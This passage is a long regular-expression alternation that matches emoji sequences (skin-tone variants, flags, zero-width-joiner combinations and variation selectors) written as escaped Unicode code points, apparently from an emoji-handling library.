}\x{1f692}|\x{1f64e}\x{200d}\x{2640}|\x{1f469}\x{200d}\x{1f3a4}|\x{1f575}\x{200d}\x{2640}|\x{1f482}\x{200d}\x{2642}|\x{1f9d1}\x{200d}\x{1f4bc}|\x{1f468}\x{200d}\x{1f4bc}|\x{1f469}\x{200d}\x{1f4bc}|\x{1f9b8}\x{200d}\x{2642}|\x{1f9b8}\x{200d}\x{2640}|\x{1f646}\x{200d}\x{2640}|\x{1f646}\x{200d}\x{2642}|\x{1f468}\x{200d}\x{1f3a4}|\x{1f468}\x{200d}\x{1f52c}|\x{1f482}\x{200d}\x{2640}|\x{1f9d1}\x{200d}\x{1f52c}|\x{1f469}\x{200d}\x{1f52c}|\x{1f9d1}\x{200d}\x{1f3a4}|\x{1f9b9}\x{200d}\x{2640}|\x{1f9d1}\x{200d}\x{1f4bb}|\x{1f645}\x{200d}\x{2640}|\x{1f645}\x{200d}\x{2642}|\x{1f468}\x{200d}\x{1f4bb}|\x{1f469}\x{200d}\x{1f4bb}|\x{1f9d9}\x{200d}\x{2640}|\x{1f9b9}\x{200d}\x{2642}|\x{1f9d9}\x{200d}\x{2642}|\x{1f6cc}\x{1f3ff}|\x{1f6cc}\x{1f3fd}|\x{1f6c0}\x{1f3ff}|\x{1f6cc}\x{1f3fc}|\x{1f6cc}\x{1f3fb}|\x{1f1f0}\x{1f1ee}|\x{1f6c0}\x{1f3fe}|\x{1f6c0}\x{1f3fd}|\x{1f6cc}\x{1f3fe}|\x{2763}\x{fe0f}|\x{1f1f0}\x{1f1ed}|\x{1f1ec}\x{1f1e7}|\x{1f46b}\x{1f3fb}|\x{1f1eb}\x{1f1f2}|\x{1f46d}\x{1f3ff}|\x{1f1eb}\x{1f1f4}|\x{1f1eb}\x{1f1f7}|\x{1f1ec}\x{1f1e6}|\x{1f1ec}\x{1f1e9}|\x{1f1eb}\x{1f1ef}|\x{1f46d}\x{1f3fe}|\x{1f1ec}\x{1f1ea}|\x{1f1ec}\x{1f1eb}|\x{1f1ec}\x{1f1ec}|\x{1f1ec}\x{1f1ed}|\x{1f1ec}\x{1f1ee}|\x{1f1eb}\x{1f1f0}|\x{2620}\x{fe0f}|\x{1f1ec}\x{1f1f1}|\x{1f1ea}\x{1f1ea}|\x{1f1e9}\x{1f1f2}|\x{1f46b}\x{1f3fe}|\x{1f1e9}\x{1f1f4}|\x{1f1e9}\x{1f1ff}|\x{1f1ea}\x{1f1e6}|\x{1f1ea}\x{1f1e8}|\x{1f46b}\x{1f3fd}|\x{1f1eb}\x{1f1ee}|\x{1f1ea}\x{1f1ec}|\x{1f1ea}\x{1f1ed}|\x{1f1ea}\x{1f1f7}|\x{1f1ea}\x{1f1f8}|\x{1f1ea}\x{1f1f9}|\x{1f46b}\x{1f3fc}|\x{1f1ea}\x{1f1fa}|\x{1f46d}\x{1f3fd}|\x{1f1ec}\x{1f1f2}|\x{1f1f0}\x{1f1ec}|\x{1f1ee}\x{1f1f6}|\x{1f6c0}\x{1f3fb}|\x{1f1ee}\x{1f1f1}|\x{1f1ee}\x{1f1f2}|\x{2764}\x{fe0f}|\x{1f1ee}\x{1f1f3}|\x{1f1ee}\x{1f1f4}|\x{1f1ee}\x{1f1f7}|\x{1f1ee}\x{1f1e9}|\x{1f1ee}\x{1f1f8}|\x{1f1ee}\x{1f1f9}|\x{1f1ef}\x{1f1ea}|\x{1f1ef}\x{1f1f2}|\x{1f1ef}\x{1f1f4}|\x{1f1ef}\x{1f1f5}|\x{1f1f0}\x{1f1ea}|\x{1f1ee}\x{1f1ea}|\x{1f1ee}\x{1f1e8}|\x{1f1ec}\x{1f1f3}|\x{1f1ec}\x{1f1fa}|\x{1f1ec}\x{1f1f5}|\x{1f1ec}\x{1f1f6}|\x{1f46d}\x{1f3fc}|\x{1f1ec}\x{1f1f7}|\x{1f1ec}\x{1f1f8}|\x{1f1ec}\x{1f1f9}|\x{1f1ec}\x{1f1fc}|\x{1f1ed}\x{1f1fa}|\x{1f46d}\x{1f3fb}|\x{1f1ec}\x{1f1fe}|\x{1f1ed}\x{1f1f0}|\x{1f1ed}\x{1f1f2}|\x{1f1ed}\x{1f1f3}|\x{1f1ed}\x{1f1f7}|\x{1f1ed}\x{1f1f9}|\x{1f6c0}\x{1f3fc}|\x{1f5ef}\x{fe0f}|\x{1f1f0}\x{1f1f2}|\x{1f93d}\x{1f3fd}|\x{1f448}\x{1f3fe}|\x{1f448}\x{1f3ff}|\x{1f1f2}\x{1f1f1}|\x{1f449}\x{1f3fb}|\x{1f449}\x{1f3fc}|\x{1f93d}\x{1f3ff}|\x{1f93d}\x{1f3fe}|\x{1f93d}\x{1f3fc}|\x{1f448}\x{1f3fc}|\x{1f93d}\x{1f3fb}|\x{1f1f2}\x{1f1f2}|\x{1f449}\x{1f3fd}|\x{1f449}\x{1f3fe}|\x{1f449}\x{1f3ff}|\x{1f1f2}\x{1f1f3}|\x{1f1f2}\x{1f1f4}|\x{1f446}\x{1f3fb}|\x{1f448}\x{1f3fd}|\x{1f448}\x{1f3fb}|\x{1f446}\x{1f3fd}|\x{1f918}\x{1f3fc}|\x{1f93e}\x{1f3fb}|\x{1f1f2}\x{1f1eb}|\x{1f91f}\x{1f3fd}|\x{1f91f}\x{1f3fe}|\x{1f91f}\x{1f3ff}|\x{1f1f2}\x{1f1ec}|\x{1f918}\x{1f3fb}|\x{1f918}\x{1f3fd}|\x{1f1f2}\x{1f1f0}|\x{1f918}\x{1f3fe}|\x{1f918}\x{1f3ff}|\x{1f1f2}\x{1f1ed}|\x{1f919}\x{1f3fb}|\x{1f919}\x{1f3fc}|\x{1f919}\x{1f3fd}|\x{1f919}\x{1f3fe}|\x{1f919}\x{1f3ff}|\x{1f446}\x{1f3fc}|\x{1f446}\x{1f3fe}|\x{1f93e}\x{1f3fd}|\x{1f44d}\x{1f3fd}|\x{1f938}\x{1f3fd}|\x{1f938}\x{1f3fc}|\x{1f938}\x{1f3fb}|\x{1f1f2}\x{1f1f8}|\x{1f1f2}\x{1f1f9}|\x{1f44d}\x{1f3fb}|\x{1f44d}\x{1f3fc}|\x{1f44d}\x{1f3fe}|\x{1f938}\x{1f3ff}|\x{1f44d}\x{1f3ff}|\x{1f1f2}\x{1f1fa}|\x{1f44e}\x{1f3fb}|\x{1f44e}\x{1f3fc}|\x{1f44e}\x{1f3fd}|\x{1f44e}\x{1f3fe}|\x{1f44e}\x{1f3ff}|\x{1f1f2}\x{1f1fb}|\x{1f938}\x{1f3fe}|\x{261d}\x{1f3ff}|\x{1f446}\x{1f3ff}|\x{1f447}\x{1f3fb}|\x{1f1f2}\x{1f1f5}|\x{1f595}\x{1f3fb}|\x{1f595}\x{1f3fc}|\x{1f595}\x{1f3fd}|\x{1f595}\x{1f3fe}|\x{1f595}\x{1f3ff}|\x{1f1f2}\x{1f1f6}|\x{1f447}\x{1f3fc}|\x{261d}\x{1f3fe}|\x{1f447}\x{1f3fd}|\x{1f447}\x{1f3fe}|\x{1f447}\x{1f3ff}|\x{261d}\x{fe0f}|\x{1f1f2}\x{1f1f7}|\x{261d}\x{1f3fb}|\x{261d}\x{1f3fc}|\x{261d}\x{1f3fd}|\x{1f93e}\x{1f3fc}|\x{1f93e}\x{1f3fe}|\x{1f1f0}\x{1f1f3}|\x{1f590}\x{fe0f}|\x{1f9d8}\x{1f3ff}|\x{1f9d8}\x{1f3fe}|\x{1f9d8}\x{1f3fd}|\x{1f9d8}\x{1f3fc}|\x{1f9d8}\x{1f3fb}|\x{1f1f1}\x{1f1f7}|\x{1f91a}\x{1f3ff}|\x{1f1f1}\x{1f1f8}|\x{1f91a}\x{1f3fd}|\x{1f590}\x{1f3fb}|\x{1f590}\x{1f3fc}|\x{1f590}\x{1f3fd}|\x{1f590}\x{1f3fe}|\x{1f590}\x{1f3ff}|\x{1f1f1}\x{1f1f9}|\x{270b}\x{1f3fb}|\x{270b}\x{1f3fc}|\x{1f91a}\x{1f3fe}|\x{1f91a}\x{1f3fc}|\x{270b}\x{1f3fe}|\x{1f1f1}\x{1f1e6}|\x{1f1f0}\x{1f1f5}|\x{1f1f0}\x{1f1f7}|\x{1f1f0}\x{1f1fc}|\x{1f1f0}\x{1f1fe}|\x{1f5e8}\x{fe0f}|\x{1f1f0}\x{1f1ff}|\x{1f1e9}\x{1f1ef}|\x{1f1f1}\x{1f1e7}|\x{1f91a}\x{1f3fb}|\x{1f1f1}\x{1f1e8}|\x{1f1f1}\x{1f1ee}|\x{1f44b}\x{1f3fb}|\x{1f44b}\x{1f3fc}|\x{1f44b}\x{1f3fd}|\x{1f44b}\x{1f3fe}|\x{1f44b}\x{1f3ff}|\x{1f1f1}\x{1f1f0}|\x{270b}\x{1f3fd}|\x{270b}\x{1f3ff}|\x{1f93e}\x{1f3ff}|\x{270c}\x{1f3ff}|\x{1f90f}\x{1f3ff}|\x{270c}\x{fe0f}|\x{1f1f2}\x{1f1e8}|\x{270c}\x{1f3fb}|\x{270c}\x{1f3fc}|\x{270c}\x{1f3fd}|\x{270c}\x{1f3fe}|\x{1f1f2}\x{1f1e9}|\x{1f90f}\x{1f3fd}|\x{1f91e}\x{1f3fb}|\x{1f91e}\x{1f3fc}|\x{1f91e}\x{1f3fd}|\x{1f91e}\x{1f3fe}|\x{1f91e}\x{1f3ff}|\x{1f1f2}\x{1f1ea}|\x{1f91f}\x{1f3fb}|\x{1f91f}\x{1f3fc}|\x{1f90f}\x{1f3fe}|\x{1f90f}\x{1f3fc}|\x{1f1f1}\x{1f1fa}|\x{1f44c}\x{1f3fd}|\x{1f596}\x{1f3fb}|\x{1f596}\x{1f3fc}|\x{1f596}\x{1f3fd}|\x{1f596}\x{1f3fe}|\x{1f596}\x{1f3ff}|\x{1f1f1}\x{1f1fb}|\x{1f44c}\x{1f3fb}|\x{1f44c}\x{1f3fc}|\x{1f939}\x{1f3ff}|\x{1f90f}\x{1f3fb}|\x{1f939}\x{1f3fe}|\x{1f939}\x{1f3fd}|\x{1f939}\x{1f3fc}|\x{1f939}\x{1f3fb}|\x{1f1f1}\x{1f1fe}|\x{1f44c}\x{1f3fe}|\x{1f44c}\x{1f3ff}|\x{1f1f2}\x{1f1e6}|\x{1f1e9}\x{1f1f0}|\x{1f1e7}\x{1f1f6}|\x{1f1e9}\x{1f1ec}|\x{1f5dc}\x{fe0f}|\x{26a0}\x{fe0f}|\x{26e9}\x{fe0f}|\x{26b1}\x{fe0f}|\x{26b0}\x{fe0f}|\x{1f3d9}\x{fe0f}|\x{2668}\x{fe0f}|\x{1f6cb}\x{fe0f}|\x{1f6cf}\x{fe0f}|\x{2697}\x{fe0f}|\x{26d3}\x{fe0f}|\x{1f3ce}\x{fe0f}|\x{2696}\x{fe0f}|\x{1f3cd}\x{fe0f}|\x{2699}\x{fe0f}|\x{1f3d8}\x{fe0f}|\x{1f6e1}\x{fe0f}|\x{1f6e3}\x{fe0f}|\x{1f6e4}\x{fe0f}|\x{1f6e2}\x{fe0f}|\x{2694}\x{fe0f}|\x{1f5e1}\x{fe0f}|\x{1f6e0}\x{fe0f}|\x{2692}\x{fe0f}|\x{26cf}\x{fe0f}|\x{1f6f3}\x{fe0f}|\x{26f4}\x{fe0f}|\x{1f5dd}\x{fe0f}|\x{1f6e5}\x{fe0f}|\x{2708}\x{fe0f}|\x{1f3da}\x{fe0f}|\x{2622}\x{fe0f}|\x{1f5d1}\x{fe0f}|\x{2199}\x{fe0f}|\x{2721}\x{fe0f}|\x{1f549}\x{fe0f}|\x{269b}\x{fe0f}|\x{1f9dc}\x{1f3ff}|\x{2935}\x{fe0f}|\x{2934}\x{fe0f}|\x{21aa}\x{fe0f}|\x{1f37d}\x{fe0f}|\x{21a9}\x{fe0f}|\x{2194}\x{fe0f}|\x{2195}\x{fe0f}|\x{2196}\x{fe0f}|\x{2b05}\x{fe0f}|\x{1f5fa}\x{fe0f}|\x{1f3d4}\x{fe0f}|\x{1f3d7}\x{fe0f}|\x{2b07}\x{fe0f}|\x{26f0}\x{fe0f}|\x{2198}\x{fe0f}|\x{1f3d5}\x{fe0f}|\x{27a1}\x{fe0f}|\x{1f3d6}\x{fe0f}|\x{1f3dc}\x{fe0f}|\x{2197}\x{fe0f}|\x{1f3dd}\x{fe0f}|\x{1f3de}\x{fe0f}|\x{2b06}\x{fe0f}|\x{1f3df}\x{fe0f}|\x{1f3db}\x{fe0f}|\x{2623}\x{fe0f}|\x{1f6e9}\x{fe0f}|\x{1f5c4}\x{fe0f}|\x{262f}\x{fe0f}|\x{1f5a5}\x{fe0f}|\x{26f1}\x{fe0f}|\x{2744}\x{fe0f}|\x{2603}\x{fe0f}|\x{2604}\x{fe0f}|\x{1f56f}\x{fe0f}|\x{1f4fd}\x{fe0f}|\x{1f39e}\x{fe0f}|\x{1f397}\x{fe0f}|\x{1f39f}\x{fe0f}|\x{1f396}\x{fe0f}|\x{1f5b2}\x{fe0f}|\x{1f5b1}\x{fe0f}|\x{2328}\x{fe0f}|\x{1f5a8}\x{fe0f}|\x{260e}\x{fe0f}|\x{1f5de}\x{fe0f}|\x{26f8}\x{fe0f}|\x{1f39b}\x{fe0f}|\x{1f39a}\x{fe0f}|\x{1f399}\x{fe0f}|\x{1f579}\x{fe0f}|\x{2660}\x{fe0f}|\x{2665}\x{fe0f}|\x{2666}\x{fe0f}|\x{2663}\x{fe0f}|\x{265f}\x{fe0f}|\x{1f5bc}\x{fe0f}|\x{26d1}\x{fe0f}|\x{1f576}\x{fe0f}|\x{1f6cd}\x{fe0f}|\x{2602}\x{fe0f}|\x{1f32c}\x{fe0f}|\x{1f5c3}\x{fe0f}|\x{2712}\x{fe0f}|\x{1f6f0}\x{fe0f}|\x{2702}\x{fe0f}|\x{1f6ce}\x{fe0f}|\x{1f587}\x{fe0f}|\x{23f1}\x{fe0f}|\x{23f2}\x{fe0f}|\x{1f570}\x{fe0f}|\x{1f5d3}\x{fe0f}|\x{1f5d2}\x{fe0f}|\x{1f5c2}\x{fe0f}|\x{1f58d}\x{fe0f}|\x{1f58c}\x{fe0f}|\x{1f58a}\x{fe0f}|\x{1f58b}\x{fe0f}|\x{270f}\x{fe0f}|\x{1f32b}\x{fe0f}|\x{1f5f3}\x{fe0f}|\x{1f321}\x{fe0f}|\x{2600}\x{fe0f}|\x{2709}\x{fe0f}|\x{2601}\x{fe0f}|\x{26c8}\x{fe0f}|\x{1f324}\x{fe0f}|\x{1f325}\x{fe0f}|\x{1f326}\x{fe0f}|\x{1f327}\x{fe0f}|\x{1f328}\x{fe0f}|\x{1f3f7}\x{fe0f}|\x{1f329}\x{fe0f}|\x{1f32a}\x{fe0f}|\x{2638}\x{fe0f}|\x{271d}\x{fe0f}|\x{1f1e9}\x{1f1ea}|\x{1f1e7}\x{1f1e6}|\x{270a}\x{1f3fc}|\x{1f1e7}\x{1f1f4}|\x{1f1e7}\x{1f1f3}|\x{1f1e7}\x{1f1f2}|\x{1f1e7}\x{1f1f1}|\x{1f1e7}\x{1f1ef}|\x{1f1e7}\x{1f1ee}|\x{1f1e7}\x{1f1ed}|\x{1f1e7}\x{1f1ec}|\x{1f1e7}\x{1f1eb}|\x{1f1e7}\x{1f1ea}|\x{1f1e7}\x{1f1e9}|\x{1f1e7}\x{1f1e7}|\x{1f1e6}\x{1f1ff}|\x{1f1e7}\x{1f1f8}|\x{1f1e6}\x{1f1fd}|\x{1f1e6}\x{1f1fc}|\x{1f1e6}\x{1f1fa}|\x{1f1e6}\x{1f1f9}|\x{1f1e6}\x{1f1f8}|\x{1f1e6}\x{1f1f7}|\x{1f1e6}\x{1f1f6}|\x{1f1e6}\x{1f1f4}|\x{1f1e6}\x{1f1f2}|\x{1f1e6}\x{1f1f1}|\x{1f1e6}\x{1f1ee}|\x{1f1e6}\x{1f1ec}|\x{1f1e6}\x{1f1eb}|\x{1f1e6}\x{1f1ea}|\x{1f1e7}\x{1f1f7}|\x{1f1e7}\x{1f1f9}|\x{1f1e6}\x{1f1e8}|\x{1f46c}\x{1f3fd}|\x{1f46b}\x{1f3ff}|\x{1f1e8}\x{1f1ff}|\x{1f46c}\x{1f3fb}|\x{1f1e8}\x{1f1fe}|\x{1f1e8}\x{1f1fd}|\x{1f1e8}\x{1f1fc}|\x{1f1e8}\x{1f1fb}|\x{1f1e8}\x{1f1fa}|\x{1f46c}\x{1f3fc}|\x{1f1e8}\x{1f1f7}|\x{1f1e8}\x{1f1f5}|\x{1f1e8}\x{1f1f4}|\x{1f1e8}\x{1f1f3}|\x{1f1e8}\x{1f1f2}|\x{1f1e8}\x{1f1f1}|\x{1f1e7}\x{1f1fb}|\x{2639}\x{fe0f}|\x{1f1e8}\x{1f1f0}|\x{1f1e8}\x{1f1ee}|\x{1f1e8}\x{1f1ed}|\x{1f46c}\x{1f3fe}|\x{1f1e8}\x{1f1ec}|\x{1f1e8}\x{1f1eb}|\x{1f1e8}\x{1f1e9}|\x{1f1e8}\x{1f1e8}|\x{1f1e8}\x{1f1e6}|\x{1f46c}\x{1f3ff}|\x{1f1e7}\x{1f1ff}|\x{1f1e7}\x{1f1fe}|\x{1f1e7}\x{1f1fc}|\x{1f1e6}\x{1f1e9}|\x{1f5e3}\x{fe0f}|\x{2626}\x{fe0f}|\x{267b}\x{fe0f}|\x{00a9}\x{fe0f}|\x{3030}\x{fe0f}|\x{2049}\x{fe0f}|\x{2618}\x{fe0f}|\x{203c}\x{fe0f}|\x{2747}\x{fe0f}|\x{2734}\x{fe0f}|\x{2733}\x{fe0f}|\x{303d}\x{fe0f}|\x{2716}\x{fe0f}|\x{2714}\x{fe0f}|\x{2611}\x{fe0f}|\x{1f336}\x{fe0f}|\x{269c}\x{fe0f}|\x{267e}\x{fe0f}|\x{2122}\x{fe0f}|\x{2695}\x{fe0f}|\x{2642}\x{fe0f}|\x{2640}\x{fe0f}|\x{23cf}\x{fe0f}|\x{23fa}\x{fe0f}|\x{23f9}\x{fe0f}|\x{23f8}\x{fe0f}|\x{23ee}\x{fe0f}|\x{25c0}\x{fe0f}|\x{23ef}\x{fe0f}|\x{23ed}\x{fe0f}|\x{25b6}\x{fe0f}|\x{262e}\x{fe0f}|\x{262a}\x{fe0f}|\x{00ae}\x{fe0f}|\x{1f3f5}\x{fe0f}|\x{1f3f3}\x{fe0f}|\x{1f171}\x{fe0f}|\x{25ab}\x{fe0f}|\x{25aa}\x{fe0f}|\x{25fb}\x{fe0f}|\x{25fc}\x{fe0f}|\x{3299}\x{fe0f}|\x{3297}\x{fe0f}|\x{1f43f}\x{fe0f}|\x{1f237}\x{fe0f}|\x{1f202}\x{fe0f}|\x{1f17f}\x{fe0f}|\x{1f17e}\x{fe0f}|\x{24c2}\x{fe0f}|\x{1f54a}\x{fe0f}|\x{2139}\x{fe0f}|\x{1f170}\x{fe0f}|\x{0023}\x{20e3}|\x{0039}\x{20e3}|\x{0038}\x{20e3}|\x{0037}\x{20e3}|\x{0036}\x{20e3}|\x{0035}\x{20e3}|\x{0034}\x{20e3}|\x{0033}\x{20e3}|\x{0032}\x{20e3}|\x{0031}\x{20e3}|\x{1f577}\x{fe0f}|\x{1f578}\x{fe0f}|\x{0030}\x{20e3}|\x{002a}\x{20e3}|\x{263a}\x{fe0f}|\x{270a}\x{1f3fb}|\x{1f573}\x{fe0f}|\x{270a}\x{1f3fd}|\x{1f647}\x{1f3fc}|\x{1f1f9}\x{1f1f1}|\x{1f9da}\x{1f3fe}|\x{1f3c3}\x{1f3fb}|\x{1f9da}\x{1f3ff}|\x{1f9dd}\x{1f3ff}|\x{1f3c3}\x{1f3fc}|\x{1f9dd}\x{1f3fe}|\x{1f3c3}\x{1f3fd}|\x{1f3c3}\x{1f3fe}|\x{1f3c3}\x{1f3ff}|\x{1f647}\x{1f3fe}|\x{1f9dd}\x{1f3fd}|\x{1f647}\x{1f3fd}|\x{1f9dd}\x{1f3fc}|\x{1f9da}\x{1f3fc}|\x{1f647}\x{1f3fb}|\x{1f9dd}\x{1f3fb}|\x{1f1f9}\x{1f1f0}|\x{1f9cf}\x{1f3ff}|\x{1f1ff}\x{1f1fc}|\x{1f9db}\x{1f3fb}|\x{1f9db}\x{1f3fc}|\x{1f9db}\x{1f3fd}|\x{1f9db}\x{1f3fe}|\x{1f9db}\x{1f3ff}|\x{1f9cf}\x{1f3fe}|\x{1f9cf}\x{1f3fd}|\x{1f9cf}\x{1f3fc}|\x{1f9da}\x{1f3fd}|\x{1f647}\x{1f3ff}|\x{1f9cf}\x{1f3fb}|\x{1f1f9}\x{1f1f4}|\x{1f9ce}\x{1f3fc}|\x{1f9ce}\x{1f3fd}|\x{1f9ce}\x{1f3fe}|\x{1f9ce}\x{1f3ff}|\x{1f575}\x{1f3fb}|\x{1f1f9}\x{1f1f7}|\x{1f9d9}\x{1f3fd}|\x{1f575}\x{fe0f}|\x{1f46e}\x{1f3ff}|\x{1f46e}\x{1f3fe}|\x{1f46e}\x{1f3fd}|\x{1f46e}\x{1f3fc}|\x{1f46e}\x{1f3fb}|\x{1f937}\x{1f3ff}|\x{1f1f9}\x{1f1f2}|\x{1f937}\x{1f3fe}|\x{1f937}\x{1f3fd}|\x{1f9d9}\x{1f3fe}|\x{1f937}\x{1f3fc}|\x{1f937}\x{1f3fb}|\x{1f1f9}\x{1f1f3}|\x{1f9d9}\x{1f3ff}|\x{1f926}\x{1f3ff}|\x{1f926}\x{1f3fe}|\x{1f1ff}\x{1f1f2}|\x{1f926}\x{1f3fd}|\x{1f926}\x{1f3fc}|\x{1f9da}\x{1f3fb}|\x{1f926}\x{1f3fb}|\x{1f9dc}\x{1f3fb}|\x{1f9dc}\x{1f3fc}|\x{1f9d9}\x{1f3fc}|\x{1f645}\x{1f3ff}|\x{1f1f9}\x{1f1e6}|\x{1f9d6}\x{1f3fb}|\x{1f9d6}\x{1f3fc}|\x{1f9d6}\x{1f3fd}|\x{1f9d6}\x{1f3fe}|\x{1f9d6}\x{1f3ff}|\x{1f1f8}\x{1f1ff}|\x{1f646}\x{1f3ff}|\x{1f646}\x{1f3fe}|\x{1f646}\x{1f3fd}|\x{1f646}\x{1f3fc}|\x{1f646}\x{1f3fb}|\x{1f1f8}\x{1f1fe}|\x{1f645}\x{1f3fe}|\x{1f481}\x{1f3fc}|\x{1f645}\x{1f3fd}|\x{1f645}\x{1f3fc}|\x{1f645}\x{1f3fb}|\x{1f1f8}\x{1f1fd}|\x{1f64e}\x{1f3ff}|\x{1f64e}\x{1f3fe}|\x{1f64e}\x{1f3fd}|\x{1f64e}\x{1f3fc}|\x{1f64e}\x{1f3fb}|\x{1f1f8}\x{1f1fb}|\x{1f9d7}\x{1f3fb}|\x{1f9d7}\x{1f3fc}|\x{1f9d7}\x{1f3fd}|\x{1f9d7}\x{1f3fe}|\x{1f481}\x{1f3fb}|\x{1f481}\x{1f3fd}|\x{1f9dc}\x{1f3fd}|\x{1f483}\x{1f3fe}|\x{1f1f9}\x{1f1ef}|\x{1f64b}\x{1f3ff}|\x{1f9dc}\x{1f3fe}|\x{1f64b}\x{1f3fe}|\x{1f64b}\x{1f3fd}|\x{1f64b}\x{1f3fc}|\x{1f64b}\x{1f3fb}|\x{1f1f9}\x{1f1ed}|\x{1f481}\x{1f3ff}|\x{1f1f9}\x{1f1ec}|\x{1f483}\x{1f3fb}|\x{1f483}\x{1f3fc}|\x{1f483}\x{1f3fd}|\x{1f483}\x{1f3ff}|\x{1f481}\x{1f3fe}|\x{1f1f9}\x{1f1eb}|\x{1f57a}\x{1f3fb}|\x{1f57a}\x{1f3fc}|\x{1f57a}\x{1f3fd}|\x{1f57a}\x{1f3fe}|\x{1f57a}\x{1f3ff}|\x{1f574}\x{fe0f}|\x{1f1f9}\x{1f1e9}|\x{1f574}\x{1f3fb}|\x{1f574}\x{1f3fc}|\x{1f574}\x{1f3fd}|\x{1f574}\x{1f3fe}|\x{1f574}\x{1f3ff}|\x{1f1f9}\x{1f1e8}|\x{1f9ce}\x{1f3fb}|\x{270a}\x{1f3fe}|\x{1f1f8}\x{1f1f9}|\x{1f6b6}\x{1f3fc}|\x{1f47c}\x{1f3fe}|\x{1f47c}\x{1f3ff}|\x{1f1fb}\x{1f1f3}|\x{1f9d5}\x{1f3ff}|\x{1f385}\x{1f3fb}|\x{1f9d5}\x{1f3fe}|\x{1f9d5}\x{1f3fd}|\x{1f9d5}\x{1f3fc}|\x{1f9d5}\x{1f3fb}|\x{1f1fa}\x{1f1fe}|\x{1f385}\x{1f3fc}|\x{1f1fa}\x{1f1f8}|\x{1f6b6}\x{1f3fb}|\x{1f6b6}\x{1f3fd}|\x{1f47c}\x{1f3fd}|\x{1f6b6}\x{1f3fe}|\x{1f6b6}\x{1f3ff}|\x{1f385}\x{1f3fd}|\x{1f472}\x{1f3ff}|\x{1f472}\x{1f3fe}|\x{1f472}\x{1f3fd}|\x{1f472}\x{1f3fc}|\x{1f472}\x{1f3fb}|\x{1f1fa}\x{1f1f3}|\x{1f473}\x{1f3ff}|\x{1f473}\x{1f3fe}|\x{1f385}\x{1f3fe}|\x{1f473}\x{1f3fd}|\x{1f1fa}\x{1f1ff}|\x{1f47c}\x{1f3fc}|\x{1f473}\x{1f3fb}|\x{1f487}\x{1f3fd}|\x{1f470}\x{1f3fe}|\x{1f470}\x{1f3ff}|\x{1f470}\x{1f3fc}|\x{1f1fb}\x{1f1e8}|\x{1f930}\x{1f3fb}|\x{1f930}\x{1f3fc}|\x{1f930}\x{1f3fd}|\x{1f930}\x{1f3fe}|\x{1f930}\x{1f3ff}|\x{1f470}\x{1f3fb}|\x{1f1fb}\x{1f1e6}|\x{1f487}\x{1f3ff}|\x{1f487}\x{1f3fe}|\x{1f487}\x{1f3fc}|\x{1f47c}\x{1f3fb}|\x{1f487}\x{1f3fb}|\x{1f1fb}\x{1f1ea}|\x{1f935}\x{1f3ff}|\x{1f1fb}\x{1f1ec}|\x{1f931}\x{1f3fb}|\x{1f931}\x{1f3fc}|\x{1f935}\x{1f3fe}|\x{1f935}\x{1f3fd}|\x{1f931}\x{1f3fd}|\x{1f935}\x{1f3fc}|\x{1f931}\x{1f3fe}|\x{1f935}\x{1f3fb}|\x{1f931}\x{1f3ff}|\x{1f1fb}\x{1f1ee}|\x{1f473}\x{1f3fc}|\x{1f385}\x{1f3ff}|\x{1f9d9}\x{1f3fb}|\x{1f9b9}\x{1f3fb}|\x{1f477}\x{1f3fd}|\x{1f9b8}\x{1f3fb}|\x{1f9b8}\x{1f3fc}|\x{1f9b8}\x{1f3fd}|\x{1f477}\x{1f3fc}|\x{1f477}\x{1f3fb}|\x{1f1fd}\x{1f1f0}|\x{1f1f9}\x{1f1fc}|\x{1f482}\x{1f3ff}|\x{1f9b8}\x{1f3fe}|\x{1f9b8}\x{1f3ff}|\x{1f1fe}\x{1f1ea}|\x{1f1fe}\x{1f1f9}|\x{1f482}\x{1f3fe}|\x{1f477}\x{1f3fe}|\x{1f482}\x{1f3fd}|\x{1f9b9}\x{1f3fc}|\x{1f482}\x{1f3fc}|\x{1f9b9}\x{1f3fd}|\x{1f482}\x{1f3fb}|\x{1f1f9}\x{1f1fb}|\x{1f575}\x{1f3ff}|\x{1f575}\x{1f3fe}|\x{1f9b9}\x{1f3fe}|\x{1f9b9}\x{1f3ff}|\x{1f575}\x{1f3fd}|\x{1f575}\x{1f3fc}|\x{1f1ff}\x{1f1e6}|\x{1f1f9}\x{1f1f9}|\x{1f1fc}\x{1f1f8}|\x{1f477}\x{1f3ff}|\x{1f1fa}\x{1f1f2}|\x{1f936}\x{1f3fe}|\x{1f478}\x{1f3ff}|\x{1f478}\x{1f3fe}|\x{1f478}\x{1f3fd}|\x{1f478}\x{1f3fc}|\x{1f1fb}\x{1f1fa}|\x{1f478}\x{1f3fb}|\x{1f1fa}\x{1f1ec}|\x{1f934}\x{1f3ff}|\x{1f936}\x{1f3fb}|\x{1f936}\x{1f3fc}|\x{1f936}\x{1f3fd}|\x{1f934}\x{1f3fe}|\x{1f934}\x{1f3fd}|\x{1f934}\x{1f3fc}|\x{1f1f9}\x{1f1ff}|\x{1f1fa}\x{1f1e6}|\x{1f936}\x{1f3ff}|\x{1f9cd}\x{1f3fb}|\x{1f9cd}\x{1f3fc}|\x{1f486}\x{1f3ff}|\x{1f9cd}\x{1f3fd}|\x{1f9cd}\x{1f3fe}|\x{1f486}\x{1f3fe}|\x{1f9cd}\x{1f3ff}|\x{1f486}\x{1f3fd}|\x{1f486}\x{1f3fc}|\x{1f486}\x{1f3fb}|\x{1f934}\x{1f3fb}|\x{1f1fc}\x{1f1eb}|\x{1f9d7}\x{1f3ff}|\x{1f470}\x{1f3fd}|\x{1f64d}\x{1f3ff}|\x{1f1f5}\x{1f1f8}|\x{1f6b4}\x{1f3fd}|\x{1f1f5}\x{1f1f9}|\x{1f3ca}\x{1f3fb}|\x{1f6b4}\x{1f3fc}|\x{1f3ca}\x{1f3fc}|\x{1f6b4}\x{1f3fb}|\x{1f3ca}\x{1f3fd}|\x{1f1f3}\x{1f1ea}|\x{1f3ca}\x{1f3fe}|\x{1f1f3}\x{1f1eb}|\x{1f450}\x{1f3fb}|\x{1f450}\x{1f3fc}|\x{1f3ca}\x{1f3ff}|\x{1f450}\x{1f3fd}|\x{1f1f5}\x{1f1f7}|\x{1f1f5}\x{1f1fc}|\x{1f443}\x{1f3fd}|\x{1f932}\x{1f3fe}|\x{1f443}\x{1f3fb}|\x{1f64d}\x{1f3fe}|\x{1f443}\x{1f3fc}|\x{1f932}\x{1f3fd}|\x{1f932}\x{1f3fc}|\x{1f932}\x{1f3fb}|\x{1f1f5}\x{1f1f3}|\x{1f443}\x{1f3fe}|\x{1f1f3}\x{1f1ec}|\x{1f443}\x{1f3ff}|\x{1f450}\x{1f3ff}|\x{1f1f5}\x{1f1f2}|\x{1f450}\x{1f3fe}